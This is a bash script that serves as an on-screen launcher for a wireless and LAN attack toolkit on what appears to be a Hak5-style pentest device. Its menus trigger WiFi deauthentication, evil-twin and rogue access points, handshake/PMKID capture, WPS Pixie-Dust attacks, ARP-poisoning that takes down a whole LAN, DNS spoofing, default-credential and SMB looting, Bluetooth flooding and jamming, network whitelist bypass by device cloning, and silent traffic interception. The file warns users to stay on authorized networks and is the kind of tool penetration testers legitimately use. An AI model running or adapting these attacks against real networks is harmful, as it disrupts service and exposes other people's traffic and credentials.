#!/bin/bash
# Title: Controller
# Author: florian
# Description: One on-screen launcher for the whole toolkit - a 3x2 grid of themes (WiFi / LAN / Bluetooth / Dual-Radio / Implant / Loot). Pick a theme, it asks what you want, gathers the parameters on-screen, and fires the right tool. No SSH needed on-site. Returns to the grid after each action; cancel the top grid to exit.
# Version: 1.0
#
# This is the on-device "controller.sh" - it does not reimplement any
# attack, it just drives the existing toolkit scripts (deauth.sh,
# EvilTwin.sh, ssidpool.sh, LanScan.sh, sniff.sh, dnsspoof.sh, deadnet.sh,
# bluetooth.sh, mgmt.sh, loot.sh) the same way the individual payloads do,
# using the platform's on-screen menu primitives (LIST_PICKER / MAC_PICKER /
# NUMBER_PICKER / TEXT_PICKER / CONFIRMATION_DIALOG / WAIT_FOR_BUTTON_PRESS).
#
# LIST_PICKER's LAST argument is the REQUIRED preselected default (Hak5 docs:
# `LIST_PICKER [title] [option...] [default]`) - every call below ends with
# one, never leave it off.
#
# IMPORTANT: only run against your own devices/networks or ones you are
# explicitly authorized to test.

S=/root/scripts

# need SCRIPT - guard that a backing script is present; ERROR_DIALOG + fail
# if not, so a half-deployed toolkit gives a clear message instead of a
# silent no-op.
need() {
    if [ ! -x "$S/$1" ]; then
        ERROR_DIALOG "$1 not found - run the toolkit setup.py first."
        return 1
    fi
    return 0
}

# run_until_b LABEL START... : the shared "start a backgrounded attack, tell
# the user, wait for B, then stop" flow every offensive tool here shares.
# The caller passes the stop command via the STOP_CMD global (an array) set
# right before calling, because the start command is variable-length.

# -- WiFi -------------------------------------------------------------------
theme_wifi() {
    need deauth.sh || return
    local a
    a=$(LIST_PICKER "WiFi" "Air recon (APs/clients)" "Deauth a target" "Handshake/PMKID capture" "WPS (scan / pixie)" "wifite2 (auto audit)" "Evil Twin (clone AP)" "Beacon flood (SSID pool)" "Back" "Deauth a target") || return
    case "$a" in
    "wifite2 (auto audit)")
        need wifite2.sh || return
        if [ -z "$(find_external_wifi)" ]; then
            ERROR_DIALOG "wifite2 needs the external A8000 (it won't touch the PineAP radios). Plug it in, or run 'wifite2' over SSH for full interactive control."
            return
        fi
        local wtype secs targ
        wtype=$(LIST_PICKER "wifite2 attack" "PMKID (clientless)" "WPA handshake" "WPS / Pixie" "PMKID (clientless)") || return
        secs=$(NUMBER_PICKER "Scan seconds, then attack all in range" "30") || return
        case "$wtype" in
            "PMKID (clientless)") targ="--pmkid" ;;
            "WPA handshake")      targ="--wpa" ;;
            "WPS / Pixie")        targ="--wps" ;;
        esac
        CONFIRMATION_DIALOG "wifite2 will attack ALL $wtype networks in range after ${secs}s. Authorized area only - continue?" || return
        LOG "wifite2 pillage ($wtype) on the external adapter - see /tmp/pager-wifite2.log"
        ( "$S/wifite2.sh" $targ -p "$secs" --kill >/tmp/pager-wifite2.log 2>&1 ) &
        local wp=$!
        ALERT "wifite2 running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        kill "$wp" 2>/dev/null; pkill -f Wifite.py 2>/dev/null
        LOG "wifite2 stopped. Loot in /root/loot + hs/ ; log /tmp/pager-wifite2.log"
        ALERT "wifite2 stopped"
        ;;
    "Air recon (APs/clients)")
        need airscout.sh || return
        local secs
        secs=$(NUMBER_PICKER "Listen seconds" "20") || return
        LOG "Passively listening on wlan1mon for ${secs}s (APs + PMF posture + client probes)..."
        LOG "$("$S/airscout.sh" --seconds "$secs" --mode both 2>&1)"
        ALERT "Air recon done - see log (PMF 'off' = soft deauth target)"
        ;;
    "Handshake/PMKID capture")
        need wifikit.sh || return
        # hcxdumptool needs a dedicated raw radio and refuses the internal
        # wlanXmon VIFs - so on-screen capture requires the external A8000.
        # (Internal --force capture is SSH-only, to avoid a radio hang from
        # the on-screen menu.)
        if [ -z "$(find_external_wifi)" ]; then
            ERROR_DIALOG "Plug the external A8000 into USB-A for capture (internal-radio capture is SSH-only via --force). Wait ~10s and retry."
            return
        fi
        local secs channel
        secs=$(NUMBER_PICKER "Capture seconds" "60") || return
        channel=$(NUMBER_PICKER "Channel (0 = hop all)" "0") || return
        local chan_arg=""; [ "$channel" != "0" ] && chan_arg="--channel $channel"
        LOG "Capturing handshakes/PMKID for ${secs}s on the external adapter..."
        "$S/wifikit.sh" --capture --seconds "$secs" $chan_arg -y >/tmp/pager-controller.log 2>&1
        local hash
        hash=$("$S/wifikit.sh" --convert -y 2>&1)
        LOG "$hash"
        ALERT "Capture done - see log for hash file"
        ;;
    "Deauth a target")
        local bssid target channel
        bssid=$(MAC_PICKER "AP BSSID" "") || return
        target=$(MAC_PICKER "Target client (FF:FF:FF:FF:FF:FF = all)" "FF:FF:FF:FF:FF:FF") || return
        channel=$(NUMBER_PICKER "Channel" "6") || return
        CONFIRMATION_DIALOG "Deauth $target from $bssid on ch $channel until you press B?" || return
        if ! "$S/deauth.sh" --bssid "$bssid" --target "$target" --channel "$channel" --background -y; then
            ERROR_DIALOG "Deauth did not start - see /tmp/pager-deauth.log."
            return
        fi
        ALERT "Deauth running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/deauth.sh" --stop
        LOG "Deauth stopped."; ALERT "Deauth stopped"
        ;;
    "WPS (scan / pixie)")
        need wpskit.sh || return
        local w
        w=$(LIST_PICKER "WPS" "Scan for WPS APs" "Pixie-Dust attack" "Back" "Scan for WPS APs") || return
        case "$w" in
        "Scan for WPS APs")
            local secs; secs=$(NUMBER_PICKER "Scan seconds" "20") || return
            LOG "Scanning for WPS-enabled APs (${secs}s)..."
            LOG "$("$S/wpskit.sh" --scan --seconds "$secs" 2>&1)"
            ALERT "WPS scan done - 'Lck No' = attackable"
            ;;
        "Pixie-Dust attack")
            if [ -z "$(find_external_wifi)" ]; then
                ERROR_DIALOG "WPS attack injects - plug the external A8000 in first (internal-radio attack is SSH-only via --force, hang risk)."
                return
            fi
            local b c; b=$(MAC_PICKER "Target AP BSSID" "") || return
            c=$(NUMBER_PICKER "Channel" "6") || return
            CONFIRMATION_DIALOG "Pixie-Dust $b on ch $c?" || return
            LOG "Running Pixie-Dust against $b..."
            LOG "$("$S/wpskit.sh" --pixie --bssid "$b" --channel "$c" -y 2>&1 | tail -20)"
            ALERT "Pixie-Dust finished - see log for PIN/PSK"
            ;;
        esac
        ;;
    "Evil Twin (clone AP)")
        need EvilTwin.sh || return
        local ssid pw
        ssid=$(TEXT_PICKER "SSID to clone" "") || return
        [ -z "$ssid" ] && { ERROR_DIALOG "SSID cannot be empty."; return; }
        pw=$(TEXT_PICKER "Clone password (blank = open AP)" "") || return
        CONFIRMATION_DIALOG "Stand up an evil twin of '$ssid' until you press B?" || return
        if [ -n "$pw" ]; then
            "$S/EvilTwin.sh" --cloned "$ssid" --clone-pw "$pw" -y >/tmp/pager-controller.log 2>&1
        else
            "$S/EvilTwin.sh" --cloned "$ssid" -y >/tmp/pager-controller.log 2>&1
        fi
        if [ $? -ne 0 ]; then
            ERROR_DIALOG "Evil twin did not start - see /tmp/pager-controller.log."
            return
        fi
        ALERT "Evil twin '$ssid' up - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/EvilTwin.sh" --off -y
        LOG "Evil twin stopped."; ALERT "Evil twin stopped"
        ;;
    "Beacon flood (SSID pool)")
        need ssidpool.sh || return
        CONFIRMATION_DIALOG "Auto-collect nearby SSIDs and flood the air with them until you press B?" || return
        "$S/ssidpool.sh" --collect on -y >/dev/null 2>&1
        if ! "$S/ssidpool.sh" --on random -y; then
            ERROR_DIALOG "Beacon flood did not start."
            "$S/ssidpool.sh" --collect off -y >/dev/null 2>&1
            return
        fi
        ALERT "Beacon flood running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/ssidpool.sh" --off -y >/dev/null 2>&1
        "$S/ssidpool.sh" --collect off -y >/dev/null 2>&1
        LOG "Beacon flood stopped."; ALERT "Beacon flood stopped"
        ;;
    esac
}

# -- LAN --------------------------------------------------------------------
theme_lan() {
    local a
    a=$(LIST_PICKER "LAN" "Deep scan" "Auto-pwn (deep)" "Topology map" "Client-isolation test" "DNS spoof" "LAN kill (DeadNet)" "Back" "Deep scan") || return
    case "$a" in
    "Topology map")
        need topomap.sh || return
        LOG "Mapping the LAN topology from eth1 (listening for LLDP/CDP + probing upward)..."
        LOG "$("$S/topomap.sh" --iface eth1 --seconds 20 -y 2>&1 | tail -40)"
        ALERT "Topology map done - see log + /root/loot/topomap/"
        ;;
    "Client-isolation test")
        need clientiso.sh || return
        LOG "Testing client isolation on eth1 (can peers reach each other?)..."
        LOG "$("$S/clientiso.sh" --iface eth1 2>&1)"
        ALERT "Isolation test done - see log"
        ;;
    "Auto-pwn (deep)")
        need lanpwn.sh || return
        CONFIRMATION_DIALOG "Discover the wired LAN (eth1), scan services, then try default creds + SMB loot + NSE? Authorized network only!" || return
        LOG "Auto-pwn running over eth1 - discovery, service scan, NSE, default-creds, SMB loot. This can take several minutes..."
        local out
        out=$("$S/lanpwn.sh" --auto --iface eth1 -y 2>&1)
        LOG "$out"
        ALERT "Auto-pwn done - see log + /root/loot/lanpwn/"
        ;;
    "Deep scan")
        need LanScan.sh || return
        local mode
        mode=$(LIST_PICKER "Scan mode" "ping" "quick" "service" "full" "vuln" "quick") || return
        LOG "Running $mode scan over the LAN - this can take a while..."
        local out
        out=$("$S/LanScan.sh" --mode "$mode" -y 2>&1)
        LOG "$out"
        ALERT "Scan complete - see log"
        ;;
    "DNS spoof")
        need dnsspoof.sh || return
        local host ip
        host=$(TEXT_PICKER "Domain to spoof (e.g. example.com)" "") || return
        [ -z "$host" ] && { ERROR_DIALOG "Domain cannot be empty."; return; }
        ip=$(TEXT_PICKER "Answer clients with this IP" "172.16.52.1") || return
        CONFIRMATION_DIALOG "Point '$host' at $ip for AP clients until you press B?" || return
        "$S/dnsspoof.sh" --add "$host" "$ip" -y >/dev/null 2>&1
        if ! "$S/dnsspoof.sh" --on -y; then
            ERROR_DIALOG "DNS spoof did not start."
            return
        fi
        ALERT "DNS spoof active - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/dnsspoof.sh" --off -y >/dev/null 2>&1
        LOG "DNS spoof stopped."; ALERT "DNS spoof stopped"
        ;;
    "LAN kill (DeadNet)")
        need deadnet.sh || return
        CONFIRMATION_DIALOG "ARP-poison the WHOLE LAN (eth1)? Authorized network only!" || return
        LOG "Discovering live hosts first..."
        LOG "$("$S/deadnet.sh" --discover --iface eth1 -y 2>&1)"
        if ! "$S/deadnet.sh" --iface eth1 --no-discover --background -y; then
            ERROR_DIALOG "LAN kill did not start - see /tmp/pager-deadnet.log (missing python3/scapy?)."
            return
        fi
        ALERT "LAN kill running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/deadnet.sh" --stop
        LOG "LAN kill stopped."; ALERT "LAN kill stopped"
        ;;
    esac
}

# -- Bluetooth (mirrors the Bluetooth Jam payload) --------------------------
theme_bluetooth() {
    need bluetooth.sh || return
    local a
    a=$(LIST_PICKER "Bluetooth" "Scan" "Flood a target" "Jam the area" "Adv-spam area" "Disrupt area" "Scan") || return
    case "$a" in
    "Scan")
        LOG "Scanning for nearby Bluetooth devices (15s)..."
        LOG "$("$S/bluetooth.sh" --scan --duration 15 -y 2>&1)"
        ALERT "Scan complete - see log"
        ;;
    "Flood a target")
        local mac
        mac=$(MAC_PICKER "Target MAC (from a scan)" "") || return
        CONFIRMATION_DIALOG "L2CAP-flood $mac? No effect if it's already connected elsewhere." || return
        if ! "$S/bluetooth.sh" --flood "$mac" -y --background; then
            ERROR_DIALOG "Flood did not start."
            return
        fi
        ALERT "BT flood running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/bluetooth.sh" --stop
        LOG "BT flood stopped."; ALERT "BT flood stopped"
        ;;
    "Jam the area")
        CONFIRMATION_DIALOG "Scan then flood EVERY nearby Bluetooth device? Authorized area only!" || return
        if ! "$S/bluetooth.sh" --jam-area -y --background; then
            ERROR_DIALOG "Area jam did not start."
            return
        fi
        ALERT "Area jam running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/bluetooth.sh" --stop
        LOG "Area jam stopped."; ALERT "Area jam stopped"
        ;;
    "Adv-spam area")
        CONFIRMATION_DIALOG "Flood the area with fake BLE adverts?" || return
        local out rc
        out=$("$S/bluetooth.sh" --advspam -y 2>&1); rc=$?
        LOG "$out"
        [ "$rc" -ne 0 ] && { ERROR_DIALOG "Adv-spam failed to start."; return; }
        ALERT "BLE adv-spam running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/bluetooth.sh" --stop
        LOG "Adv-spam stopped."; ALERT "Adv-spam stopped"
        ;;
    "Disrupt area")
        CONFIRMATION_DIALOG "Occupy the 2.4GHz Bluetooth band directly? Works on connected devices too." || return
        if ! "$S/bluetooth.sh" --disrupt --background -y; then
            ERROR_DIALOG "Disrupt did not start."
            return
        fi
        ALERT "Disrupt running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/bluetooth.sh" --stop
        LOG "Disrupt stopped."; ALERT "Disrupt stopped"
        ;;
    esac
}

# -- Dual-Radio (internal + external A8000) ---------------------------------
# Detect a THIRD, external WiFi interface (the internal radios are wlan0 and
# wlan1; an external USB adapter like the Netgear A8000 shows up as wlan2+).
find_external_wifi() {
    local i
    for i in /sys/class/net/wlan[2-9]; do
        [ -e "$i" ] && { basename "$i"; return 0; }
    done
    return 1
}
theme_dualradio() {
    local ext
    ext=$(find_external_wifi)
    if [ -z "$ext" ]; then
        ERROR_DIALOG "No external WiFi adapter found. Plug the A8000 into the USB-A port, wait ~10s, and retry."
        return
    fi
    local a
    a=$(LIST_PICKER "Dual-Radio ($ext found)" "Evil-twin + deauth herd" "Rogue 5GHz AP" "Adapter info" "Back" "Adapter info") || return
    case "$a" in
    "Rogue 5GHz AP")
        need rogueap.sh || return
        local ssid pw uplink
        ssid=$(TEXT_PICKER "Rogue AP SSID" "") || return
        [ -z "$ssid" ] && { ERROR_DIALOG "SSID cannot be empty."; return; }
        pw=$(TEXT_PICKER "WPA2 password (blank = open)" "") || return
        if CONFIRMATION_DIALOG "Give clients real internet via eth1 uplink? (No = capture-only AP)"; then
            uplink="--uplink eth1"
        else
            uplink=""
        fi
        local pwarg=""; [ -n "$pw" ] && pwarg="--pass $pw"
        LOG "Standing up 5GHz rogue AP '$ssid' on $ext (ch 36)..."
        "$S/rogueap.sh" --up --ssid "$ssid" --iface "$ext" --channel 36 $pwarg $uplink -y >/tmp/pager-controller.log 2>&1
        if [ $? -ne 0 ]; then
            ERROR_DIALOG "Rogue AP failed - see /tmp/pager-controller.log (adapter may not support 5GHz AP mode)."
            return
        fi
        ALERT "Rogue 5GHz AP '$ssid' up - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/rogueap.sh" --down --iface "$ext" ${uplink} -y >/dev/null 2>&1
        LOG "Rogue AP torn down."; ALERT "Rogue AP stopped"
        ;;
    "Evil-twin + deauth herd")
        # Real dual-radio combo achievable with the current tools: the clone
        # AP runs on the internal radio0 (EvilTwin.sh) while deauth runs on
        # the internal radio1 monitor iface - two radios at once, herding
        # clients off the real AP onto the twin. (External-adapter INJECTION
        # combos are the next build - they need per-iface support in
        # deauth.sh and on-device testing with the A8000 attached.)
        need EvilTwin.sh || return
        need deauth.sh || return
        local ssid bssid channel
        ssid=$(TEXT_PICKER "SSID to clone" "") || return
        [ -z "$ssid" ] && { ERROR_DIALOG "SSID cannot be empty."; return; }
        bssid=$(MAC_PICKER "Real AP BSSID (to deauth off)" "") || return
        channel=$(NUMBER_PICKER "AP channel" "6") || return
        CONFIRMATION_DIALOG "Clone '$ssid' AND deauth clients off $bssid at the same time, until B?" || return
        "$S/EvilTwin.sh" --cloned "$ssid" -y >/tmp/pager-controller.log 2>&1
        if [ $? -ne 0 ]; then
            ERROR_DIALOG "Evil twin did not start - see /tmp/pager-controller.log."
            return
        fi
        if ! "$S/deauth.sh" --bssid "$bssid" --target "FF:FF:FF:FF:FF:FF" --channel "$channel" --background -y; then
            "$S/EvilTwin.sh" --off -y
            ERROR_DIALOG "Deauth half did not start - twin rolled back."
            return
        fi
        ALERT "Herd running (twin + deauth) - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/deauth.sh" --stop
        "$S/EvilTwin.sh" --off -y
        LOG "Herd stopped (twin + deauth down)."; ALERT "Herd stopped"
        ;;
    "Adapter info")
        LOG "External adapter: $ext"
        LOG "$(iw dev "$ext" info 2>&1)"
        LOG "$(iw phy "phy$(cat /sys/class/net/$ext/phy80211/name 2>/dev/null | sed 's/phy//')" info 2>/dev/null | grep -A6 'Supported interface modes' 2>/dev/null)"
        ALERT "Adapter info in log"
        ;;
    esac
}

# -- Implant ----------------------------------------------------------------
theme_implant() {
    local a
    a=$(LIST_PICKER "Implant" "Device clone (whitelist bypass)" "DNS walled-garden" "Stealth intercept (hang net)" "Out-of-band mgmt AP" "USB-C gadget drop (planned)" "Back" "Device clone (whitelist bypass)") || return
    case "$a" in
    "Device clone (whitelist bypass)")
        need usbclone.sh || return
        local sub
        sub=$(LIST_PICKER "Device clone" "1. Capture PC identity (USB-C)" "2. Clone onto LAN (eth1)" "Restore eth1" "Status" "1. Capture PC identity (USB-C)") || return
        case "$sub" in
        "1. Capture PC identity (USB-C)")
            LOG "$("$S/usbclone.sh" --capture -y 2>&1)"; ALERT "Identity capture - see log" ;;
        "2. Clone onto LAN (eth1)")
            CONFIRMATION_DIALOG "Clone the captured identity onto eth1 and DHCP onto the LAN?" || return
            LOG "$("$S/usbclone.sh" --clone -y 2>&1)"; ALERT "Clone applied - see log" ;;
        "Restore eth1")
            LOG "$("$S/usbclone.sh" --restore -y 2>&1)"; ALERT "eth1 restored" ;;
        "Status")
            LOG "$("$S/usbclone.sh" --status -y 2>&1)"; ALERT "Status in log" ;;
        esac
        ;;
    "DNS walled-garden")
        need walledgarden.sh || return
        local ip
        ip=$(TEXT_PICKER "Allowed IP (every lookup resolves here)" "172.16.52.1") || return
        CONFIRMATION_DIALOG "Trap the tethered host: every DNS answer -> $ip, until you press B?" || return
        if ! "$S/walledgarden.sh" --on --ip "$ip" --lock -y >/tmp/pager-controller.log 2>&1; then
            ERROR_DIALOG "Walled garden failed - see /tmp/pager-controller.log."; return
        fi
        ALERT "Walled garden up - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/walledgarden.sh" --off -y >/dev/null 2>&1
        LOG "Walled garden off."; ALERT "Walled garden off"
        ;;
    "Stealth intercept (hang net)")
        need stealthnet.sh || return
        CONFIRMATION_DIALOG "Make the tethered host's internet 'hang' while silently capturing it, until B?" || return
        if ! "$S/stealthnet.sh" --on -y >/tmp/pager-controller.log 2>&1; then
            ERROR_DIALOG "Stealth intercept failed - see log (needs a working uplink)."; return
        fi
        ALERT "Stealth intercept up - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/stealthnet.sh" --off -y >/dev/null 2>&1
        LOG "Stealth intercept off - host internet restored."; ALERT "Restored"
        ;;
    "Out-of-band mgmt AP")
        need mgmt.sh || return
        local ssid pw
        ssid=$(TEXT_PICKER "Mgmt AP SSID" "pager-oob") || return
        pw=$(TEXT_PICKER "Mgmt AP password (>=8 chars)" "") || return
        if [ -n "$pw" ] && [ "${#pw}" -lt 8 ]; then
            ERROR_DIALOG "Password must be at least 8 characters (or blank for the script default)."
            return
        fi
        if [ -n "$pw" ]; then
            "$S/mgmt.sh" --on --name "$ssid" --pw "$pw" -y >/tmp/pager-controller.log 2>&1
        else
            "$S/mgmt.sh" --on --name "$ssid" -y >/tmp/pager-controller.log 2>&1
        fi
        if [ $? -ne 0 ]; then
            ERROR_DIALOG "Mgmt AP did not start - see /tmp/pager-controller.log."
            return
        fi
        ALERT "Mgmt AP '$ssid' up (172.16.52.1). B = stop"
        WAIT_FOR_BUTTON_PRESS B
        "$S/mgmt.sh" --off -y >/dev/null 2>&1
        LOG "Mgmt AP stopped."; ALERT "Mgmt AP stopped"
        ;;
    "USB-C gadget drop (planned)")
        ERROR_DIALOG "USB-C gadget drop attack (PoisonTap) is on the roadmap, not built yet. See Dev/PENTEST-IDEAS.md (I1)."
        ;;
    esac
}

# -- Loot -------------------------------------------------------------------
theme_loot() {
    need loot.sh || return
    local a
    a=$(LIST_PICKER "Loot" "List loot" "Save current" "Archive all" "Back" "List loot") || return
    case "$a" in
    "List loot")   LOG "$("$S/loot.sh" --list 2>&1)"; ALERT "Loot list in log";;
    "Save current")LOG "$("$S/loot.sh" --save -y 2>&1)"; ALERT "Loot saved";;
    "Archive all") LOG "$("$S/loot.sh" --archive -y 2>&1)"; ALERT "Loot archived";;
    esac
}

# -- top grid loop ----------------------------------------------------------
while :; do
    __t=$(LIST_PICKER "Controller" "WiFi" "LAN" "Bluetooth" "Dual-Radio" "Implant" "Loot" "WiFi") || exit 0
    case "$__t" in
        "WiFi")       theme_wifi ;;
        "LAN")        theme_lan ;;
        "Bluetooth")  theme_bluetooth ;;
        "Dual-Radio") theme_dualradio ;;
        "Implant")    theme_implant ;;
        "Loot")       theme_loot ;;
    esac
done
